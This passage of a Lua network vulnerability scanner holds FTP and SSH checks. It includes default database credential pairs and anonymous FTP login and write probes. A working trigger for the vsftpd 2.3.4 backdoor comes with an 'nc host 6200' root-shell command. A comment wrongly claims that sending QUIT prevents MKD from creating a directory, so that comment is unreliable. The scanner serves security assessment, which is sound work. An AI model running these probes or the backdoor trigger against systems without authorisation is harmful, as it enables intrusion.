      key, ctx.port_number
    ))
    return
  end

  -- Attach helper to context
  ctx.add_finding = ctx_add_finding
  ctx.module_ran  = key

  log_info(ctx, "dispatcher", string.format("Dispatching module '%s' (aggression=%d, timeout=%dms)",
    key, ctx.config.aggression, ctx.config.timeout))

  -- Invoke module inside pcall for isolation
  local ok, err = pcall(run_fn, ctx)
  if not ok then
    log_error(ctx, key, "Module runtime error: " .. tostring(err))
  end
end

-- ===========================================================================
-- PLACEHOLDER MODULE: "unknown"
-- A catch-all that records a basic banner-grab finding.
-- Real modules will be registered in subsequent days.
-- ===========================================================================
register_module("unknown", function(ctx)
  -- This should rarely fire given the portrule, but acts as a safety net.
  ctx:add_finding(
    "Unrecognised service detected",
    "Port is open but no specific Reko module is available for this service. "
    .. "Manual investigation recommended.",
    { port = tostring(ctx.port_number), protocol = ctx.protocol },
    0.50,   -- confidence: moderate (we know it's open)
    0.30    -- impact: low (unknown service)
  )
end)


--- Open a TCP socket to host:port with a millisecond timeout.
-- Returns (socket, nil) on success, (nil, err_string) on failure.
local function tcp_connect(host_ip, port_number, timeout_ms)
  local sd = nmap.new_socket()
  sd:set_timeout(timeout_ms)
  local status, err = sd:connect(host_ip, port_number, "tcp")
  if not status then
    return nil, tostring(err)
  end
  return sd, nil
end

--- Read a single line (up to \n) or up to max_bytes from an open socket.
-- Returns (data_string, nil) or (nil, err_string).
local function sock_readline(sd)
  local status, data = sd:receive_lines(1)
  if not status then return nil, tostring(data) end
  return data, nil
end

--- Send data over an open socket.
-- Returns (true, nil) or (false, err_string).
local function sock_send(sd, data)
  local status, err = sd:send(data)
  if not status then return false, tostring(err) end
  return true, nil
end

--- Close a socket safely (ignores errors).
local function sock_close(sd)
  if sd then pcall(function() sd:close() end) end
end

--- Trim leading/trailing whitespace from a string.
local function trim(s)
  return (s or ""):match("^%s*(.-)%s*$")
end

--- Check whether a string contains a substring (case-insensitive).
local function icontains(haystack, needle)
  return (haystack or ""):lower():find(needle:lower(), 1, true) ~= nil
end


-- ── Day 2 modules: FTP + SSH ────────────────

-- ── Shared binary helpers (used by Day 7 DB modules AND Day 8 VNC/RMI) ────────

--- Read exactly n bytes from a socket, returning nil on failure.
local function read_bytes(sd, n)
  local status, data = sd:receive_bytes(n)
  if not status or #data < n then return nil end
  return data
end

--- Read a 4-byte big-endian unsigned integer from a byte string at offset.
local function read_u32_be(s, offset)
  if not s or #s < offset + 3 then return 0 end
  return s:byte(offset)   * 16777216
       + s:byte(offset+1) * 65536
       + s:byte(offset+2) * 256
       + s:byte(offset+3)
end

--- Read a 2-byte little-endian unsigned integer.
local function read_u16_le(s, offset)
  if not s or #s < offset + 1 then return 0 end
  return s:byte(offset) + s:byte(offset+1) * 256
end

--- Read a 4-byte little-endian unsigned integer.
local function read_u32_le(s, offset)
  if not s or #s < offset + 3 then return 0 end
  return s:byte(offset)
       + s:byte(offset+1) * 256
       + s:byte(offset+2) * 65536
       + s:byte(offset+3) * 16777216
end

--- Build a 4-byte big-endian integer string.
local function u32_be(n)
  return string.char(
    math.floor(n/16777216)%256,
    math.floor(n/65536)%256,
    math.floor(n/256)%256,
    n%256
  )
end

--- Build a 4-byte little-endian integer string.
local function u32_le(n)
  return string.char(
    n%256,
    math.floor(n/256)%256,
    math.floor(n/65536)%256,
    math.floor(n/16777216)%256
  )
end

--- Build a 2-byte little-endian integer string.
local function u16_le(n)
  return string.char(n%256, math.floor(n/256)%256)
end

-- Default credential pairs (used by DB modules at aggression >= 1)
local DB_DEFAULT_CREDS = {
  mssql = {
    { "sa",       "",          "SA with empty password" },
    { "sa",       "sa",        "SA with username as password" },
    { "sa",       "Password1", "SA with common default" },
    { "admin",    "admin",     "Generic admin account" },
  },
  mysql = {
    { "root",     "",          "Root with empty password (MySQL default)" },
    { "root",     "root",      "Root with username as password" },
    { "root",     "mysql",     "Root with service name as password" },
    { "admin",    "",          "Admin with empty password" },
  },
  postgresql = {
    { "postgres", "postgres",  "Default postgres superuser" },
    { "postgres", "",          "Postgres with empty password" },
    { "admin",    "admin",     "Generic admin" },
  },
  oracle = {
    { "sys",      "change_on_install", "Oracle classic default" },
    { "system",   "manager",           "Oracle classic system account" },
    { "scott",    "tiger",             "Oracle demo account" },
    { "dbsnmp",   "dbsnmp",            "Oracle SNMP monitoring account" },
  },
}


do  -- scope block: keeps locals under Lua 5.1's 200-variable limit


-- ===========================================================================
-- FTP MODULE  (port 21/tcp)
-- ===========================================================================
-- Checks performed (by aggression level):
--
--  AGG 0 – passive:
--    [P1] Banner grab: FTP server software + version from 220 greeting
--    [P2] TLS/FTPS support: send AUTH TLS, check for 234 response
--
--  AGG 1 – safe-active (requires aggression >= 1):
--    [A1] Anonymous login: USER anonymous / PASS reko@reko.local
--    [A2] Anonymous home directory listing via PASV + LIST (read-only)
--    [A3] Write permission probe: attempt MKD on a randomly-named dir
--         (we only check the response code; no directory is actually created
--          because we send QUIT before the server processes MKD if it accepts)
--
--  Scoring rationale:
--    base_weight for ftp = 0.80 (from SERVICE_BASE_WEIGHT in Day 1)
--    Anonymous login          → confidence 0.99, impact 0.85  → CRITICAL
--    Anonymous writable share → confidence 0.99, impact 0.90  → CRITICAL
--    Clear-text only (no TLS) → confidence 0.95, impact 0.55  → HIGH
--    Banner disclosed version → confidence 0.95, impact 0.35  → MEDIUM
-- ===========================================================================

--- Parse the software/version string out of an FTP 220 banner.
-- Common patterns:
--   "220 ProFTPD 1.3.5e Server (Debian) [::ffff:10.0.0.1]"
--   "220 (vsFTPd 3.0.3)"
--   "220 FileZilla Server 0.9.60 beta"
--   "220 Microsoft FTP Service"
-- Returns a table: { raw, software, version }
local function ftp_parse_banner(banner_line)
  local raw = trim(banner_line)
  -- Strip leading "220 " or "220-"
  local body = raw:match("^220[- ](.+)") or raw

  -- Try to extract "Product vX.Y.Z" style
  local software, version = body:match("([%a][%w%s%-]+)%s+v?(%d[%d%.%w%-]+)")
  if not software then
    -- vsFTPd style: "(vsFTPd 3.0.3)"
    software, version = body:match("%((%a[%w%s%-]+)%s+v?(%d[%d%.%w%-]+)%)")
  end
  if not software then
    -- Fallback: take the first meaningful word(s) as software name
    software = body:match("^([%a][%w%s%-]+)") or "Unknown FTP"
    version  = "unknown"
  end

  return {
    raw      = raw,
    software = trim(software),
    version  = trim(version or "unknown"),
  }
end

--- Attempt FTP anonymous login.
-- Sends: USER anonymous\r\n  → expects 3xx
--        PASS reko@reko.local\r\n → expects 230 (login ok) or 530 (denied)
-- Returns: "success" | "denied" | "error"
-- Also returns the server's reply string for evidence.
local function ftp_try_anonymous(sd)
  -- Send USER
  local ok, err = sock_send(sd, "USER anonymous\r\n")
  if not ok then return "error", "send USER failed: " .. err end

  local resp, rerr = sock_readline(sd)
  if not resp then return "error", "read USER response failed: " .. rerr end
  resp = trim(resp)

  -- Expect 331 (password required) or occasionally 230 (no password needed)
  local code = resp:match("^(%d%d%d)")
  if code == "230" then
    return "success", resp   -- logged in without password
  elseif code ~= "331" then
    return "denied", resp    -- unexpected – treat as denied
  end

  -- Send PASS
  ok, err = sock_send(sd, "PASS reko@reko.local\r\n")
  if not ok then return "error", "send PASS failed: " .. err end

  resp, rerr = sock_readline(sd)
  if not resp then return "error", "read PASS response failed: " .. rerr end
  resp = trim(resp)

  code = resp:match("^(%d%d%d)")
  if code == "230" then
    return "success", resp
  else
    return "denied", resp
  end
end

--- Attempt AUTH TLS to detect FTPS/STARTTLS support.
-- Returns: "supported" | "unsupported" | "error"
local function ftp_probe_tls(sd)
  local ok, err = sock_send(sd, "AUTH TLS\r\n")
  if not ok then return "error", "send AUTH TLS failed: " .. err end

  local resp, rerr = sock_readline(sd)
  if not resp then return "error", "read AUTH TLS response failed: " .. rerr end
  resp = trim(resp)

  local code = resp:match("^(%d%d%d)")
  -- 234 = AUTH TLS accepted;  5xx = not supported
  if code == "234" then
    return "supported", resp
  else
    return "unsupported", resp
  end
end

--- Enter PASV mode and attempt LIST to enumerate the home directory.
-- Returns (listing_lines_table, nil) or (nil, err_string).
-- NOTE: opens a *second* data socket – always cleaned up in a finally block.
local function ftp_list_directory(sd, host_ip, timeout_ms)
  -- Send PASV
  local ok, err = sock_send(sd, "PASV\r\n")
  if not ok then return nil, "PASV send failed: " .. err end

  local resp, rerr = sock_readline(sd)
  if not resp then return nil, "PASV read failed: " .. rerr end
  resp = trim(resp)

  -- Parse PASV response: 227 Entering Passive Mode (h1,h2,h3,h4,p1,p2)
  local h1,h2,h3,h4,p1,p2 = resp:match("%((%d+),(%d+),(%d+),(%d+),(%d+),(%d+)%)")
  if not h1 then
    return nil, "Could not parse PASV address from: " .. resp
  end

  local data_ip   = table.concat({h1,h2,h3,h4}, ".")
  local data_port = tonumber(p1) * 256 + tonumber(p2)

  -- Open data connection
  local data_sd, derr = tcp_connect(data_ip, data_port, timeout_ms)
  if not data_sd then
    return nil, "Data socket connect failed: " .. derr
  end

  -- Send LIST on control socket
  ok, err = sock_send(sd, "LIST\r\n")
  if not ok then
    sock_close(data_sd)
    return nil, "LIST send failed: " .. err
  end

  -- Read 150 (transfer starting) from control socket
  resp, rerr = sock_readline(sd)
  if not resp then
    sock_close(data_sd)
    return nil, "LIST 150 read failed: " .. rerr
  end

  -- Read listing from data socket (up to 4 KB to avoid flooding)
  local listing_raw = ""
  local bytes_read  = 0
  local MAX_LIST    = 4096
  while bytes_read < MAX_LIST do
    local status, chunk = data_sd:receive()
    if not status or chunk == nil then break end
    listing_raw = listing_raw .. chunk
    bytes_read  = bytes_read + #chunk
  end
  sock_close(data_sd)

  -- Read 226 (transfer complete) from control socket – ignore errors here
  pcall(function() sd:receive_lines(1) end)

  -- Split listing into individual entry lines
  local entries = {}
  for line in listing_raw:gmatch("[^\r\n]+") do
    local trimmed = trim(line)
    if trimmed ~= "" then
      table.insert(entries, trimmed)
    end
  end
  return entries, nil
end

--- Probe for writable anonymous FTP: send MKD with a canary name.
-- We send QUIT immediately after MKD so even if 257 is returned the
-- connection drops before the server can finalise the operation.
-- Returns "writable" | "readonly" | "error"
local function ftp_probe_write(sd)
  local canary = string.format("reko_probe_%d", os.time())
  local ok, err = sock_send(sd, "MKD " .. canary .. "\r\n")
  if not ok then return "error", "MKD send failed: " .. err end

  -- Immediately send QUIT to prevent any side-effect
  sock_send(sd, "QUIT\r\n")

  local resp, rerr = sock_readline(sd)
  if not resp then return "error", "MKD read failed: " .. (rerr or "?") end
  resp = trim(resp)

  local code = resp:match("^(%d%d%d)")
  if code == "257" then
    return "writable", resp   -- server would have created it
  else
    return "readonly", resp
  end
end

-- Main FTP module entry point
register_module("ftp", function(ctx)
  local host_ip   = ctx.target_ip
  local port_num  = ctx.port_number
  local timeout   = ctx.config.timeout
  local agg       = ctx.config.aggression

  -- ---- [P1] Banner grab ------------------------------------------------
  local sd, conn_err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "ftp", "Cannot connect to " .. host_ip .. ":" .. port_num .. " – " .. conn_err)
    return
  end

  -- Read the 220 greeting (may be multi-line; read first line only)
  local banner_line, berr = sock_readline(sd)
  if not banner_line then
    log_warn(ctx, "ftp", "No banner received: " .. (berr or "timeout"))
    sock_close(sd)
    return
  end

  local banner = ftp_parse_banner(banner_line)
  log_info(ctx, "ftp", "Banner: " .. banner.raw)

  -- CVE lookup for disclosed version (C4)
  local ftp_cve = cve_lookup(banner.software, banner.version)
  local ftp_cve_note = ftp_cve and
    string.format(" CVE: %s (%s) — %s", ftp_cve.cve, ftp_cve.severity, ftp_cve.note) or ""
  local ftp_impact = ftp_cve and (ftp_cve.severity == "CRITICAL" and 0.75 or 0.50) or 0.35

  ctx:add_finding(
    "FTP service banner disclosed" .. (ftp_cve and (" — " .. ftp_cve.cve .. " known") or ""),
    string.format(
      "The FTP service returned a detailed greeting banner revealing server "
      .. "software and version. Software: %s  Version: %s.%s",
      banner.software, banner.version, ftp_cve_note
    ),
    {
      banner_raw  = banner.raw,
      software    = banner.software,
      version     = banner.version,
      cve         = ftp_cve and ftp_cve.cve     or "none known",
      exploit_db  = ftp_cve and (ftp_cve.edb and ("https://www.exploit-db.com/exploits/" .. ftp_cve.edb) or "n/a") or "n/a",
      cve_note    = ftp_cve and ftp_cve.note    or "",
    },
    0.95,
    ftp_impact
  )

  -- ---- [P2] TLS probe (passive – just sends one command) ---------------
  -- We re-use the same connection; AUTH TLS is safe even without auth.
  local tls_status, tls_resp = ftp_probe_tls(sd)

  if tls_status == "unsupported" then
    ctx:add_finding(
      "FTP transmits credentials in cleartext (no FTPS/AUTH TLS)",
      "The FTP server does not support AUTH TLS (FTPS). Usernames, passwords, "
      .. "and file content are transmitted in plaintext over the network, making "
      .. "them trivially interceptable by any network observer. Upgrade to FTPS "
      .. "or replace FTP with SFTP (SSH file transfer).",
      {
        auth_tls_response = tls_resp or "no response",
        remediation       = "Enable AUTH TLS or migrate to SFTP",
      },
      0.95,   -- confidence: server explicitly rejected AUTH TLS
      0.55    -- impact: credentials exposed in transit
    )
    log_info(ctx, "ftp", "AUTH TLS: not supported")
  elseif tls_status == "supported" then
    log_info(ctx, "ftp", "AUTH TLS: supported – FTPS available")
    -- Positive finding: note TLS support in findings at INFO level
    ctx:add_finding(
      "FTPS (AUTH TLS) is supported",
      "The FTP server supports AUTH TLS, enabling encrypted control and data "
      .. "channels when clients negotiate TLS. Verify that the server enforces "
      .. "TLS and does not allow unencrypted fallback.",
      { auth_tls_response = tls_resp },
      0.90,
      0.10    -- low impact (good configuration)
    )
  else
    log_warn(ctx, "ftp", "AUTH TLS probe returned error: " .. (tls_resp or "?"))
  end

  -- After AUTH TLS probe the connection state is uncertain (server may have
  -- closed it or be expecting a TLS handshake).  Close and re-open for
  -- active checks to get a clean unauthenticated session.
  sock_close(sd)

  -- ---- Active checks (aggression >= 1 required) -------------------------
  if agg < 1 then
    log_info(ctx, "ftp", "Aggression level %d: skipping active checks", agg)
    return
  end

  -- Re-connect for anonymous login attempt
  sd, conn_err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_warn(ctx, "ftp", "Re-connect for active checks failed: " .. conn_err)
    return
  end

  -- Consume the 220 banner on the fresh connection
  sock_readline(sd)

  -- ---- [A1] Anonymous login --------------------------------------------
  local anon_result, anon_resp = ftp_try_anonymous(sd)
  log_info(ctx, "ftp", "Anonymous login result: " .. anon_result)

  if anon_result == "success" then
    -- Confirmed anonymous access – elevate impact substantially
    ctx:add_finding(
      "FTP anonymous login permitted",
      "The FTP server accepted login with username 'anonymous' and a dummy "
      .. "email password. Anonymous access allows any unauthenticated user to "
      .. "browse and potentially download files without credentials. This is a "
      .. "HIGH or CRITICAL finding depending on directory contents.",
      {
        login_user     = "anonymous",
        login_pass     = "reko@reko.local",
        server_reply   = anon_resp,
        remediation    = "Disable anonymous FTP or restrict to a dedicated, "
                         .. "isolated chroot with no sensitive data",
      },
      0.99,   -- confidence: login was accepted
      0.85    -- impact: unauthenticated file access
    )

    -- ---- [A2] Home directory listing -----------------------------------
    local entries, list_err = ftp_list_directory(sd, host_ip, timeout)
    if entries then
      -- Keep evidence concise: first 20 entries only
      local sample = {}
      for i = 1, math.min(20, #entries) do
        table.insert(sample, entries[i])
      end
      ctx:add_finding(
        string.format("FTP anonymous home directory listed (%d entries)", #entries),
        "After successful anonymous login the home directory was enumerated "
        .. "via PASV + LIST. Directory contents are shown in evidence. Review "
        .. "for sensitive files, configuration data, or backup archives.",
        {
          total_entries  = tostring(#entries),
          sample_entries = table.concat(sample, " | "),
          remediation    = "Restrict anonymous chroot to an empty or read-only "
                           .. "directory with no sensitive content",
        },
        0.99,
        0.80
      )
      log_info(ctx, "ftp", string.format("Listed %d entries in anonymous home dir", #entries))
    else
      log_warn(ctx, "ftp", "Directory listing failed: " .. (list_err or "unknown"))
    end

    -- ---- [A3] Write permission probe ----------------------------------
    -- Re-open a fresh connection because ftp_list_directory may have
    -- consumed the control socket's state.
    sock_close(sd)
    sd, conn_err = tcp_connect(host_ip, port_num, timeout)
    if sd then
      sock_readline(sd)   -- consume banner
      ftp_try_anonymous(sd)   -- log in again
      local write_result, write_resp = ftp_probe_write(sd)
      sd = nil  -- ftp_probe_write sends QUIT; socket is effectively dead

      if write_result == "writable" then
        ctx:add_finding(
          "FTP anonymous login: write access permitted (CRITICAL)",
          "The server responded with 257 to an MKD command issued over an "
          .. "anonymous session, indicating write access is granted to "
          .. "anonymous users. An attacker can upload malicious files, "
          .. "overwrite existing content, or use the server as a staging area.",
          {
            mkd_response  = write_resp,
            remediation   = "Set the anonymous FTP chroot to read-only "
                            .. "(chmod 555 or equivalent) and disable write "
                            .. "permissions for the ftp/nobody user",
          },
          0.99,
          0.90    -- extremely high impact
        )
        log_warn(ctx, "ftp", "Anonymous write access CONFIRMED")
      else
        log_info(ctx, "ftp", "Anonymous write access: denied (" .. write_result .. ")")
      end
    end

  elseif anon_result == "denied" then
    log_info(ctx, "ftp", "Anonymous login denied: " .. (anon_resp or ""))
    -- No finding needed – absence of anonymous access is expected/good
  else
    log_warn(ctx, "ftp", "Anonymous login probe error: " .. (anon_resp or ""))
  end

  -- ---- [A_BACKDOOR] vsftpd 2.3.4 backdoor probe (CVE-2011-2523) ----------
  if banner and banner.software and banner.software:lower():find("vsftpd", 1, true)
     and banner.version == "2.3.4" then
    log_info(ctx, "ftp", "vsftpd 2.3.4 detected — probing CVE-2011-2523 backdoor")
    local trigger_sd, _ = tcp_connect(host_ip, port_num, timeout)
    if trigger_sd then
      sock_readline(trigger_sd)
      sock_send(trigger_sd, "USER backdoor:)\r\n")
      sock_readline(trigger_sd)
      sock_send(trigger_sd, "PASS trigger\r\n")
      sock_close(trigger_sd)
      -- Probe port 6200 for the backdoor shell
      local shell_sd, _ = tcp_connect(host_ip, 6200, 2000)
      if shell_sd then
        sock_close(shell_sd)
        ctx:add_finding(
          "vsftpd 2.3.4 BACKDOOR CONFIRMED on port 6200 (CVE-2011-2523) — ROOT SHELL",
          "The vsftpd 2.3.4 backdoor was triggered and port 6200 is now open. "
          .. "This provides an unauthenticated root shell. Connect with: nc "
          .. host_ip .. " 6200",
          {
            backdoor_port = "6200",
            cve           = "CVE-2011-2523",
            exploit_cmd   = "nc " .. host_ip .. " 6200",
            metasploit    = "exploit/unix/ftp/vsftpd_234_backdoor",
            remediation   = "Replace vsftpd immediately; firewall port 6200",
          },
          0.99, 0.99
        )
        log_warn(ctx, "ftp", "vsftpd 2.3.4 BACKDOOR CONFIRMED — root shell on port 6200!")
      else
        log_info(ctx, "ftp", "vsftpd backdoor: port 6200 not open")
      end
    end
  end

  sock_close(sd)
end)

-- ===========================================================================
-- SSH MODULE  (port 22/tcp)
-- ===========================================================================
-- Checks performed (by aggression level):
--
--  AGG 0 – passive:
--    [P1] Banner grab: SSH version string (protocol + software + OS hints)
--    [P2] Algorithm enumeration: key exchange, host key types, ciphers,
--         MACs, and compression methods advertised in the server's KEX_INIT
--         message. Weak / deprecated algorithms are flagged.
--
--  AGG 1 – safe-active (not applicable for SSH – no safe anonymous probe)
--  AGG 2 – full-active (not applicable – brute force is out of scope)
--
--  Scoring rationale:
--    base_weight for ssh = 0.45
--    Protocol version 1.x detected     → confidence 0.99, impact 0.85  → CRITICAL
--    Weak cipher (DES/RC4/arcfour/...)  → confidence 0.95, impact 0.65  → HIGH
--    Weak MAC (md5/sha1 without ETM)    → confidence 0.95, impact 0.55  → HIGH
--    Deprecated KEX (diffie-hellman-g1) → confidence 0.95, impact 0.60  → HIGH
--    Banner version disclosure          → confidence 0.95, impact 0.30  → LOW
-- ===========================================================================

-- Known-weak algorithm lists used for classification.
-- References: NIST SP 800-131A, BSI TR-02102-4, OpenSSH deprecation notices.

local SSH_WEAK_KEX = {
  ["diffie-hellman-group1-sha1"]   = "1024-bit DH group; Logjam-vulnerable",
  ["diffie-hellman-group-exchange-sha1"] = "SHA-1 based KEX; deprecated",
  ["gss-gex-sha1-*"]               = "GSS SHA-1 KEX; deprecated",
  ["gss-group1-sha1-*"]            = "GSS 1024-bit DH + SHA-1; deprecated",
  ["rsa1024-sha1"]                 = "RSA-1024 key exchange; deprecated",
}

local SSH_WEAK_HOSTKEY = {
  ["ssh-dss"]        = "DSA key (1024-bit); NIST deprecated since 2015",
  ["ecdsa-sha2-nistp256-cert-v01@openssh.com"] = "NIST P-256 potentially weak (NSA influence concerns)",
}

local SSH_WEAK_CIPHER = {
  ["3des-cbc"]       = "3DES-CBC; SWEET32 vulnerable (CVE-2016-2183)",
  ["aes128-cbc"]     = "AES-CBC mode; vulnerable to BEAST-style attacks",
  ["aes192-cbc"]     = "AES-CBC mode; vulnerable to BEAST-style attacks",
  ["aes256-cbc"]     = "AES-CBC mode; vulnerable to BEAST-style attacks",
  ["arcfour"]        = "RC4 stream cipher; cryptographically broken",
  ["arcfour128"]     = "RC4-128; cryptographically broken",
  ["arcfour256"]     = "RC4-256; cryptographically broken",
  ["blowfish-cbc"]   = "Blowfish-CBC; weak key schedule, deprecated",
  ["cast128-cbc"]    = "CAST-128 CBC; deprecated",
  ["des"]            = "Single DES; 56-bit key, brute-forceable",
  ["none"]           = "No encryption – plaintext channel",
}

local SSH_WEAK_MAC = {
  ["hmac-md5"]            = "HMAC-MD5; MD5 collision-prone, deprecated",
  ["hmac-md5-96"]         = "HMAC-MD5-96; truncated MD5, deprecated",
  ["hmac-sha1"]           = "HMAC-SHA1; SHA-1 deprecated (no ETM)",
  ["hmac-sha1-96"]        = "HMAC-SHA1-96; truncated SHA-1, deprecated",
  ["umac-64@openssh.com"] = "UMAC-64; 64-bit tag too short for modern use",
  ["none"]                = "No MAC – integrity not verified",
}

--- Parse the SSH identification string sent by the server immediately on
-- connection (before any key exchange). Format:
--   SSH-<protoversion>-<softwareversion>[ SP <comments>]CR LF
-- Returns table: { raw, proto_major, proto_minor, software, comment, is_v1 }
local function ssh_parse_banner(line)
  local raw = trim(line)
  -- Match SSH-<proto>-<software>[optional comment]
  local proto, software, comment =
    raw:match("^SSH%-([%d%.]+)%-([^%s\r\n]+)%s*(.-)%s*$")
  if not proto then
    return { raw = raw, proto_major = 0, proto_minor = 0,
             software = "unknown", comment = "", is_v1 = false }
  end

  local major = tonumber(proto:match("^(%d+)")) or 0
  local minor = tonumber(proto:match("%.(%d+)$")) or 0

  return {
    raw         = raw,
    proto_major = major,
    proto_minor = minor,
    proto       = proto,
    software    = software,
    comment     = comment or "",
    is_v1       = (major == 1),
  }
end

--- Read and parse the SSH server's KEX_INIT payload.
-- After the banner exchange both sides send SSH_MSG_KEXINIT (20).
-- This function reads the raw packet and extracts algorithm name-lists.
--
-- SSH binary packet format (RFC 4253 §6):
--   uint32   packet_length
--   byte     padding_length
--   byte[n]  payload  (payload_length = packet_length - padding_length - 1)
--   byte[p]  random padding
--   [mac not present before keys are exchanged]
--
-- SSH_MSG_KEXINIT payload (RFC 4251/4253 §7.1):
--   byte     SSH_MSG_KEXINIT (20)
--   byte[16] cookie (random)
--   name-list kex_algorithms
--   name-list server_host_key_algorithms
--   name-list encryption_algorithms_client_to_server
--   name-list encryption_algorithms_server_to_client
--   name-list mac_algorithms_client_to_server
--   name-list mac_algorithms_server_to_client
--   name-list compression_algorithms_client_to_server
--   name-list compression_algorithms_server_to_client
--   name-list languages_client_to_server
--   name-list languages_server_to_client
--   boolean  first_kex_packet_follows
--   uint32   0 (reserved)
--
-- Returns nil on any parse error (caller records a warning).
local function ssh_read_kexinit(sd)
  -- Read 4-byte packet length header
  local status, len_bytes = sd:receive_bytes(4)
  if not status or #len_bytes < 4 then return nil end

  local pkt_len = (len_bytes:byte(1) * 16777216)
               + (len_bytes:byte(2) * 65536)
               + (len_bytes:byte(3) * 256)
               +  len_bytes:byte(4)

  -- Sanity check: KEX_INIT is typically 500-2000 bytes
  if pkt_len < 20 or pkt_len > 65536 then return nil end

  -- Read the rest of the packet
  status, pkt_data = sd:receive_bytes(pkt_len)
  if not status or #pkt_data < pkt_len then return nil end

  -- byte 0: padding_length
  local padding_len = pkt_data:byte(1)
  -- byte 1: message type
  local msg_type    = pkt_data:byte(2)
  if msg_type ~= 20 then
    -- Not SSH_MSG_KEXINIT – server may have sent something else first
    return nil
  end

  -- Skip: padding_length(1) + msg_type(1) + cookie(16) = offset 18
  local pos = 19   -- 1-indexed: byte 19 is start of first name-list

  -- Helper: read a 4-byte length-prefixed UTF-8 name-list at pos.
  -- Returns (list_string, next_pos) or (nil, pos) on error.
  local function read_namelist(data, p)
    if p + 3 > #data then return nil, p end
    local nl = (data:byte(p)   * 16777216)
             + (data:byte(p+1) * 65536)
             + (data:byte(p+2) * 256)
             +  data:byte(p+3)
    p = p + 4
    if p + nl - 1 > #data then return nil, p end
    local s = data:sub(p, p + nl - 1)
    return s, p + nl
  end

  local kex_algs, hostkey_algs
  local enc_c2s, enc_s2c
  local mac_c2s, mac_s2c
  local cmp_c2s, cmp_s2c

  kex_algs,    pos = read_namelist(pkt_data, pos)
  hostkey_algs,pos = read_namelist(pkt_data, pos)
  enc_c2s,     pos = read_namelist(pkt_data, pos)
  enc_s2c,     pos = read_namelist(pkt_data, pos)
  mac_c2s,     pos = read_namelist(pkt_data, pos)
  mac_s2c,     pos = read_namelist(pkt_data, pos)
  cmp_c2s,     pos = read_namelist(pkt_data, pos)
  cmp_s2c,     _   = read_namelist(pkt_data, pos)

  -- Split comma-separated name-lists into Lua arrays
  local function split(s)
    local t = {}
    if s then
      for alg in s:gmatch("[^,]+") do
        table.insert(t, trim(alg))
      end
    end
    return t
  end

  return {
    kex          = split(kex_algs),
    hostkey      = split(hostkey_algs),
    enc_c2s      = split(enc_c2s),
    enc_s2c      = split(enc_s2c),
    mac_c2s      = split(mac_c2s),
    mac_s2c      = split(mac_s2c),
    compress_c2s = split(cmp_c2s),
    compress_s2c = split(cmp_s2c),
  }
end

--- Scan an algorithm list against a known-weak table.
-- Returns a list of { alg, reason } tables for every weak hit.
local function ssh_find_weak(alg_list, weak_table)
  local hits = {}
  for _, alg in ipairs(alg_list or {}) do
    -- Exact match first, then wildcard suffix match (e.g. "gss-*")
    local reason = weak_table[alg]
    if not reason then
      for pattern, r in pairs(weak_table) do
        if pattern:sub(-1) == "*" then
          local prefix = pattern:sub(1, -2)
          if alg:sub(1, #prefix) == prefix then
            reason = r
            break
          end
        end
      end
    end
    if reason then
      table.insert(hits, { alg = alg, reason = reason })
    end
  end
  return hits
end

-- Main SSH module entry point
register_module("ssh", function(ctx)
  local host_ip  = ctx.target_ip
  local port_num = ctx.port_number
  local timeout  = ctx.config.timeout

  -- Connect
  local sd, conn_err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "ssh", "Cannot connect to " .. host_ip .. ":" .. port_num
              .. " – " .. conn_err)
    return
  end

  -- ---- [P1] Banner grab -------------------------------------------------
  -- Read the server's identification string.
  -- Per RFC 4253 §4.2 the server MAY send other lines before the SSH-
  -- banner; we skip them (up to 10 lines).
  local banner_line
  for _ = 1, 10 do
    local line, lerr = sock_readline(sd)
    if not line then
      log_warn(ctx, "ssh", "Banner read failed: " .. (lerr or "timeout"))
      sock_close(sd)
      return
    end
    if line:match("^SSH%-") then
      banner_line = line
      break
    end
  end

  if not banner_line then
    log_warn(ctx, "ssh", "No SSH identification string found in first 10 lines")
    sock_close(sd)
    return
  end

  local banner = ssh_parse_banner(banner_line)
  log_info(ctx, "ssh", "Banner: " .. banner.raw)

  -- ---- [P1a] SSH protocol version 1.x check ----------------------------
  if banner.is_v1 then
    ctx:add_finding(
      "SSH protocol version 1.x in use (CRITICAL)",
      string.format(
        "The server advertises SSH protocol version %s. SSHv1 has fundamental "
        .. "design flaws including weak session key negotiation, lack of "
        .. "integrity protection, and susceptibility to insertion and replay "
        .. "attacks (CAN-2001-0361). Upgrade to SSHv2 immediately.",
        banner.proto
      ),
      {
        banner_raw    = banner.raw,
        protocol      = banner.proto,
        software      = banner.software,
        remediation   = "Set 'Protocol 2' in sshd_config and restart the daemon",
      },
      0.99,
      0.85
    )
  end

  -- ---- [P1b] Banner version disclosure + CVE lookup (C4) ---------------
  local ssh_cve = cve_lookup(banner.software, banner.proto)
  local ssh_cve_note = ssh_cve and
    (" CVE: " .. ssh_cve.cve .. " — " .. ssh_cve.note) or ""
  local ssh_banner_impact = ssh_cve and 0.55 or 0.30

  ctx:add_finding(
    "SSH service banner disclosed" .. (ssh_cve and (" — " .. ssh_cve.cve) or ""),
    string.format(
      "The SSH server returned an identification string revealing software and "
      .. "version. Software: %s  Protocol: %s.%s",
      banner.software, banner.proto, ssh_cve_note
    ),
    {
      banner_raw = banner.raw,
      software   = banner.software,
      protocol   = banner.proto,
      comment    = banner.comment,
      cve        = ssh_cve and ssh_cve.cve  or "none known",
      cve_note   = ssh_cve and ssh_cve.note or "",
    },
    0.95,
    ssh_banner_impact
  )

  -- ---- [P2] Algorithm enumeration via KEX_INIT -------------------------
  -- Send our client identification string so the server will send KEX_INIT.
  local client_id = "SSH-2.0-Reko_" .. REKO_VERSION .. "\r\n"
  local send_ok, send_err = sock_send(sd, client_id)
  if not send_ok then
    log_warn(ctx, "ssh", "Failed to send client ID: " .. (send_err or "?"))
    sock_close(sd)
    return
  end

  -- Read the server's KEX_INIT packet
  local kex = ssh_read_kexinit(sd)
  sock_close(sd)    -- we have what we need; close early

  if not kex then
    log_warn(ctx, "ssh", "KEX_INIT parse failed – algorithm details unavailable")
    return
  end

  log_info(ctx, "ssh", string.format(
    "KEX_INIT parsed: %d kex, %d hostkey, %d enc(c2s), %d mac(c2s)",
    #kex.kex, #kex.hostkey, #kex.enc_c2s, #kex.mac_c2s
  ))

  -- Record all algorithms as an informational finding (always useful in reports)
  ctx:add_finding(
    "SSH server algorithm advertisement",
    "The server's KEX_INIT message lists all supported cryptographic algorithms. "
